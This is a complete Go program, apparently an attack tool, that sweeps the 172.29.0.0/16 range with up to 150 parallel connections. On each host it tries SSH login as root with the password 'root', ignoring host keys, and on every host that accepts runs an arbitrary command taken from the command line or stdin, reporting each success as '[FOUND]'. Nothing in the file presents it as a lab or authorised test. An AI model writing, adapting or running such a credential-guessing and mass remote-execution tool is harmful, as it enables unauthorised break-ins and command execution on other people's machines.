package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func getCmd() string {
	if len(os.Args) > 1 {
		return strings.Join(os.Args[1:], " ")
	}

	stat, _ := os.Stdin.Stat()
	if (stat.Mode() & os.ModeCharDevice) == 0 {
		sc := bufio.NewScanner(os.Stdin)
		var b strings.Builder
		for sc.Scan() {
			b.WriteString(sc.Text() + "\n")
		}
		return b.String()
	}

	return "uname -a"
}

func scan(ip, cmd string, out chan string, wg *sync.WaitGroup, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	cfg := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.Password("root"),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout: 1200 * time.Millisecond,
	}

	c, err := ssh.Dial("tcp", net.JoinHostPort(ip, "22"), cfg)
	if err != nil {
		return
	}
	defer c.Close()

	s, err := c.NewSession()
	if err != nil {
		return
	}
	defer s.Close()

	res, err := s.CombinedOutput(cmd)
	if err != nil {
		return
	}

	out <- fmt.Sprintf("\n[FOUND] %s\n%s", ip, string(res))
}

func main() {

	fmt.Println("🔥 SCAN STARTED")

	cmd := getCmd()

	fmt.Println("CMD:")
	fmt.Println(cmd)

	var wg sync.WaitGroup
	out := make(chan string, 500)
	sem := make(chan struct{}, 150)

	go func() {
		for r := range out {
			fmt.Println(r)
		}
	}()

	for i := 0; i < 256; i++ {
		for j := 0; j < 256; j++ {

			ip := fmt.Sprintf("172.29.%d.%d", i, j)

			wg.Add(1)
			go scan(ip, cmd, out, &wg, sem)
		}
	}

	wg.Wait()
	close(out)

	fmt.Println("DONE")
}
